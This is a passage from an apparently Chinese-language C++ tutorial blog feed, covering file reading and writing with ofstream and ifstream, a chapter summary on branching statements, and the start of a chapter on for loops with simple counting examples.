方法或直接检查流对象的状态。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!outputFile.is_open()) &#123; <span class="comment">// 或者 if (!outputFile)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error opening file for writing!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// 或者进行其他错误处理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><strong>写入数据:</strong> 使用与 <code>cout</code> 类似的 <code>&lt;&lt;</code> 运算符将数据写入文件流。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> year = <span class="number">2024</span>;</span><br><span class="line"><span class="keyword">double</span> price = <span class="number">99.99</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> item = <span class="string">&quot;Gadget&quot;</span>;</span><br><span class="line">outputFile &lt;&lt; <span class="string">&quot;Item: &quot;</span> &lt;&lt; item &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">outputFile &lt;&lt; <span class="string">&quot;Year: &quot;</span> &lt;&lt; year &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">outputFile &lt;&lt; <span class="string">&quot;Price: &quot;</span> &lt;&lt; price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure></li><li><strong>关闭文件:</strong> 完成写入后，应该关闭文件以确保所有数据都被刷新（写入）到磁盘，并释放文件资源。可以显式调用 <code>close()</code> 方法，或者当 <code>ofstream</code> 对象离开其作用域时（例如函数结束），其析构函数会自动关闭文件。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outputFile.close(); <span class="comment">// 显式关闭</span></span><br></pre></td></tr></table></figure></li></ol><p><strong>示例代码:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt; // 包含文件流头文件</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 创建 ofstream 对象并关联文件</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::ofstream <span class="title">outFile</span><span class="params">(<span class="string">&quot;report.txt&quot;</span>)</span></span>; <span class="comment">// 尝试打开/创建 report.txt</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 检查文件是否成功打开</span></span><br><span class="line">    <span class="keyword">if</span> (!outFile.is_open()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Could not open report.txt for writing.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// 返回错误码</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 写入数据</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Writing data to report.txt...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    outFile &lt;&lt; <span class="string">&quot;--- Sales Report ---&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    outFile &lt;&lt; <span class="string">&quot;Product: Laptop&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    outFile &lt;&lt; <span class="string">&quot;Quantity: 15&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    outFile &lt;&lt; <span class="string">&quot;Revenue: &quot;</span> &lt;&lt; <span class="number">15</span> * <span class="number">1200.50</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    outFile &lt;&lt; <span class="string">&quot;--------------------&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 关闭文件 (虽然析构函数会自动关闭，但显式关闭是好习惯)</span></span><br><span class="line">    outFile.close();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Data written successfully.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行此程序后，将在程序所在的目录下创建一个名为 <code>report.txt</code> 的文件（如果不存在），其内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--- Sales Report ---</span><br><span class="line">Product: Laptop</span><br><span class="line">Quantity: 15</span><br><span class="line">Revenue: 18007.5</span><br><span class="line">--------------------</span><br></pre></td></tr></table></figure><h3 id="6-8-3-读取文本文件"><a href="#6-8-3-读取文本文件" class="headerlink" title="6.8.3 读取文本文件"></a>6.8.3 读取文本文件</h3><p>从文本文件读取数据与写入类似，但使用 <code>ifstream</code> 类（input file stream）。</p><p><strong>步骤:</strong></p><ol><li><p> <strong>包含头文件:</strong> <code>#include &lt;fstream&gt;</code></p></li><li><p><strong>创建 <code>ifstream</code> 对象:</strong> 创建一个 <code>ifstream</code> 对象并将其与要读取的文件名关联。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::ifstream inputFile; <span class="comment">// 创建 ifstream 对象</span></span><br><span class="line">inputFile.open(<span class="string">&quot;mydata.txt&quot;</span>); <span class="comment">// 将对象与文件关联以供读取</span></span><br><span class="line"><span class="comment">// 或者在创建时直接关联</span></span><br><span class="line"><span class="comment">// std::ifstream inputFile(&quot;mydata.txt&quot;);</span></span><br></pre></td></tr></table></figure></li><li><p><strong>检查文件是否成功打开:</strong> 同样，检查文件是否成功打开至关重要。如果文件不存在或无法访问，打开操作会失败。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!inputFile.is_open()) &#123; <span class="comment">// 或者 if (!inputFile)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error opening file for reading!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>读取数据:</strong> 可以使用与 <code>cin</code> 类似的 <code>&gt;&gt;</code> 运算符来读取由空格分隔的数据，或者使用 <code>std::getline()</code> 来读取整行。读取操作通常放在循环中，直到到达文件末尾。</p><ul><li>  <strong>使用 <code>&gt;&gt;</code> 读取:</strong> 它会跳过前导空白（空格、制表符、换行符），然后读取直到遇到下一个空白字符。</li><li>  <strong>使用 <code>std::getline(inputFile, lineString)</code> 读取:</strong> 它会读取整行（包括空格），直到遇到换行符 <code>\n</code> 为止（换行符本身会被读取并丢弃）。</li></ul></li><li><p><strong>检查文件末尾 (EOF):</strong> 当尝试读取但已无数据可读时（到达文件末尾），输入流会进入特殊状态。循环通常依赖于检查流的状态来终止。</p><ul><li>  <code>while (inputFile &gt;&gt; variable)</code>: 当 <code>&gt;&gt;</code> 成功读取时，流状态为 <code>true</code>，循环继续；到达文件末尾或遇到无效数据时，状态变为 <code>false</code>，循环终止。</li><li>  <code>while (std::getline(inputFile, lineString))</code>: 当 <code>getline</code> 成功读取一行时，流状态为 <code>true</code>；到达文件末尾时，状态变为 <code>false</code>。</li></ul></li><li><p><strong>关闭文件:</strong> 读取完成后，关闭文件。同样，可以显式调用 <code>close()</code>，或者依赖对象的析构函数。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inputFile.close();</span><br></pre></td></tr></table></figure></li></ol><p><strong>示例代码 (读取 <code>report.txt</code>):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt; // 用于存储读取的行</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 创建 ifstream 对象并关联文件</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::ifstream <span class="title">inFile</span><span class="params">(<span class="string">&quot;report.txt&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 检查文件是否成功打开</span></span><br><span class="line">    <span class="keyword">if</span> (!inFile.is_open()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Could not open report.txt for reading.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Reading data from report.txt using getline:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> line;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; lines;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 使用 getline 逐行读取</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">std</span>::getline(inFile, line)) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Read line: &quot;</span> &lt;&lt; line &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        lines.push_back(line); <span class="comment">// 将读取的行存入 vector</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查循环是因为到达文件末尾还是发生错误</span></span><br><span class="line">    <span class="keyword">if</span> (inFile.eof()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nReached end of file.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (inFile.fail()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;\nError reading file (not EOF).&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 关闭文件</span></span><br><span class="line">    inFile.close();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\n--- Stored Lines ---&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; stored_line : lines) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; stored_line &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 示例：使用 &gt;&gt; 读取特定类型的数据 (假设文件格式已知)</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::ifstream <span class="title">dataFile</span><span class="params">(<span class="string">&quot;report.txt&quot;</span>)</span></span>; <span class="comment">// 重新打开文件</span></span><br><span class="line">    <span class="keyword">if</span> (!dataFile.is_open()) &#123;</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Could not reopen report.txt&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">         <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nReading specific data using &gt;&gt; (may be fragile):&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> header, productLabel, productName, qtyLabel;</span><br><span class="line">    <span class="keyword">int</span> quantity;</span><br><span class="line">    <span class="keyword">double</span> revenue;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 跳过第一行</span></span><br><span class="line">    <span class="built_in">std</span>::getline(dataFile, header);</span><br><span class="line">    <span class="comment">// 读取第二行的数据</span></span><br><span class="line">    dataFile &gt;&gt; productLabel &gt;&gt; productName;</span><br><span class="line">    <span class="comment">// 读取第三行的数据</span></span><br><span class="line">    dataFile &gt;&gt; qtyLabel &gt;&gt; quantity;</span><br><span class="line">    <span class="comment">// 跳过第四行的 Revenue: 标签</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> revenueLabel;</span><br><span class="line">    dataFile &gt;&gt; revenueLabel &gt;&gt; revenue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dataFile) &#123; <span class="comment">// 检查读取是否成功</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Product: &quot;</span> &lt;&lt; productName &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Quantity: &quot;</span> &lt;&lt; quantity &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Revenue: &quot;</span> &lt;&lt; revenue &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Failed to parse data using &gt;&gt;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dataFile.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码解释:</strong></p><ol><li> 第一个循环使用 <code>std::getline()</code> 读取文件的每一行，并将其打印出来，同时存储在 <code>lines</code> 向量中。<code>while (std::getline(inFile, line))</code> 是读取文本文件的常用模式。</li><li> 循环结束后，通过检查 <code>inFile.eof()</code> 和 <code>inFile.fail()</code> 可以判断循环是正常结束（到达文件末尾）还是因为其他错误。</li><li> 第二个示例演示了使用 <code>&gt;&gt;</code> 操作符读取特定格式的数据。这种方法对于格式严格固定的文件可能有效，但如果文件格式稍有变化（例如多了空格），<code>&gt;&gt;</code> 就可能读取失败或读到错误的数据，因此通常不如 <code>getline</code> 健壮。需要仔细处理标签和数据类型。</li></ol><p>文件 I/O 是 C++ 编程中非常重要的部分，它使得程序能够持久化数据，并与其他程序或系统进行交互。</p><h2 id="6-9-总结"><a href="#6-9-总结" class="headerlink" title="6.9 总结"></a>6.9 总结</h2><p>本章介绍了 C++ 中用于控制程序流程的各种分支语句和相关概念，使得程序能够根据不同的条件执行不同的代码路径。</p><p>主要内容回顾：</p><ol><li><p><strong><code>if</code> 语句系列:</strong></p><ul><li>  <code>if</code> 语句：根据条件是否为真来决定是否执行某段代码。</li><li>  <code>if else</code> 语句：提供两个代码路径，根据条件为真或假选择其一执行。</li><li>  <code>if else if else</code> 结构：用于处理多个互斥的条件，提供多路分支选择。</li></ul></li><li><p><strong>逻辑运算符:</strong></p><ul><li>  <code>||</code> (逻辑或)：两个操作数中至少一个为真时，结果为真。</li><li>  <code>&amp;&amp;</code> (逻辑与)：两个操作数都为真时，结果才为真。具有短路求值特性。</li><li>  <code>!</code> (逻辑非)：反转操作数的逻辑状态（真变假，假变真）。</li></ul></li><li><p><strong><code>cctype</code> 库:</strong></p><ul><li>  提供了一系列用于处理字符的函数，如 <code>isalpha()</code>, <code>isdigit()</code>, <code>isspace()</code>, <code>ispunct()</code>, <code>toupper()</code>, <code>tolower()</code> 等，方便进行字符分类和转换。</li></ul></li><li><p><strong>三元运算符 (<code>?:</code>)</strong>:</p><ul><li>  提供了一种简洁的方式来根据条件选择两个值中的一个，是 <code>if else</code> 语句的一种紧凑替代形式，常用于简单的赋值操作。</li><li>  语法：<code>condition ? expression1 : expression2;</code></li></ul></li><li><p><strong><code>switch</code> 语句:</strong></p><ul><li>  根据一个整数表达式的值，从多个 <code>case</code> 标签中选择一个匹配的执行点。</li><li>  通常与 <code>break</code> 语句配合使用，以防止“贯穿”到下一个 <code>case</code>。</li><li>  <code>default</code> 标签处理所有其他不匹配的情况。</li><li>  <code>case</code> 标签必须是常量表达式。</li><li>  适用于基于单个离散整数值的多路分支。</li></ul></li><li><p><strong><code>break</code> 和 <code>continue</code> 语句:</strong></p><ul><li>  <code>break</code>：立即终止<strong>最内层</strong>的循环（<code>for</code>, <code>while</code>, <code>do while</code>）或 <code>switch</code> 语句。</li><li>  <code>continue</code>：跳过当前循环迭代的<strong>剩余部分</strong>，直接开始下一次迭代（更新和条件检查）。</li></ul></li><li><p><strong>读取数字的循环:</strong></p><ul><li>  演示了如何使用循环（如 <code>while (cin &gt;&gt; value)</code>）来连续读取数字输入。</li><li>  强调了处理错误输入的重要性，包括使用 <code>cin.clear()</code> 清除错误状态和 <code>cin.ignore()</code> 丢弃无效输入，以编写更健壮的输入代码。</li></ul></li><li><p><strong>简单文件输入/输出:</strong></p><ul><li>  引入了 <code>&lt;fstream&gt;</code> 库，用于文件操作。</li><li>  <code>ofstream</code>：用于向文件<strong>写入</strong>数据（输出文件流），使用 <code>&lt;&lt;</code> 操作符。</li><li>  <code>ifstream</code>：用于从文件<strong>读取</strong>数据（输入文件流），使用 <code>&gt;&gt;</code> 或 <code>getline()</code>。</li><li>  强调了文件打开检查 (<code>is_open()</code>) 和关闭文件 (<code>close()</code> 或利用对象析构) 的重要性。</li><li>  区分了文本 I/O 和二进制 I/O 的基本概念。</li></ul></li></ol><p>通过掌握这些分支结构和控制语句，可以编写出能够响应不同情况、处理用户输入和文件数据的更复杂、更灵活的 C++ 程序。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chapter 5 循环和关系表达式</title>
      <link href="2025/04/26/Cpp_tutorial_Chapter_5/"/>
      <url>2025/04/26/Cpp_tutorial_Chapter_5/</url>
      
        <content type="html"><![CDATA[<h2 id="5-1-for循环"><a href="#5-1-for循环" class="headerlink" title="5.1 for循环"></a>5.1 for循环</h2><p>循环是编程中的基本控制结构，它允许我们重复执行一段代码，直到满足某个条件为止。<code>for</code> 循环是 C++ 中最常用的循环结构之一，特别适用于已知循环次数或需要按特定步长迭代的情况。</p><h3 id="5-1-1-for循环的组成部分"><a href="#5-1-1-for循环的组成部分" class="headerlink" title="5.1.1 for循环的组成部分"></a>5.1.1 for循环的组成部分</h3><p><code>for</code> 循环的头部包含三个由分号 <code>;</code> 分隔的部分，控制着循环的执行流程：</p><ol><li><strong>初始化 (Initialization):</strong><ul><li>  在循环开始前执行<strong>一次</strong>。</li><li>  通常用于声明和/或初始化循环控制变量（计数器）。</li><li>  可以包含多条语句，用逗号分隔（见 5.1.11）。</li><li>  也可以为空。</li></ul></li><li><strong>测试条件 (Test Condition / Condition):</strong><ul><li>  在<strong>每次</strong>循环迭代开始前进行求值。</li><li>  结果必须是一个布尔值 (<code>true</code> 或 <code>false</code>) 或可以转换为布尔值（非零为 <code>true</code>，零为 <code>false</code>）。</li><li>  如果条件为 <code>true</code>，则执行循环体。</li><li>  如果条件为 <code>false</code>，则循环终止，程序继续执行循环后面的语句。</li><li>  也可以为空，空条件被视为 <code>true</code>，形成无限循环（需要其他方式跳出，如 <code>break</code>）。</li></ul></li><li><strong>更新 (Update / Increment / Decrement):</strong><ul><li>  在<strong>每次</strong>循环迭代<strong>结束时</strong>（执行完循环体之后，下次测试条件之前）执行。</li><li>  通常用于修改循环控制变量（例如，递增或递减计数器）。</li><li>  可以包含多条语句，用逗号分隔。</li><li>  也可以为空。</li></ul></li></ol><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (initialization; test_condition; update) &#123;</span><br><span class="line">    <span class="comment">// 循环体 (statement(s) to be executed repeatedly)</span></span><br><span class="line">    statement1;</span><br><span class="line">    statement2;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// 或者如果循环体只有一条语句，可以省略花括号</span></span><br><span class="line"><span class="keyword">for</span> (initialization; test_condition; update)</span><br><span class="line">    single_statement; </span><br></pre></td></tr></table></figure><p><strong>执行流程:</strong></p><ol><li> 执行 <code>initialization</code>。</li><li> 计算 <code>test_condition</code>。</li><li> 如果 <code>test_condition</code> 为 <code>false</code>，跳出循环，执行循环后面的代码。</li><li> 如果 <code>test_condition</code> 为 <code>true</code>，执行循环体中的语句。</li><li> 执行 <code>update</code>。</li><li> 回到步骤 2。</li></ol><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 打印数字 0 到 4</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; <span class="comment">// 1. 初始化: 声明并初始化计数器 i 为 0</span></span><br><span class="line">         i &lt; <span class="number">5</span>;   <span class="comment">// 2. 测试条件: 只要 i 小于 5 就继续</span></span><br><span class="line">         i = i + <span class="number">1</span>) <span class="comment">// 4. 更新: 每次循环后将 i 增加 1</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 3. 循环体</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;i = &quot;</span> &lt;&lt; i &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Loop finished.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-1-2-回到for循环"><a href="#5-1-2-回到for循环" class="headerlink" title="5.1.2 回到for循环"></a>5.1.2 回到for循环</h3><p><code>for</code> 循环提供了一种非常结构化的方式来编写计数循环。上面的例子展示了一个典型的从 0 开始计数到某个值之前的循环。</p><p><strong>基本计数循环示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 计算 1 到 10 的和</span></span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">10</span>; i = i + <span class="number">1</span>) &#123; <span class="comment">// 从 1 开始，包含 10</span></span><br><span class="line">        sum = sum + i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sum of 1 to 10 is: &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 55</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 倒序打印 5 到 1</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Countdown:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> count = <span class="number">5</span>; count &gt; <span class="number">0</span>; count = count - <span class="number">1</span>) &#123;</span><br><span class="line">        <span 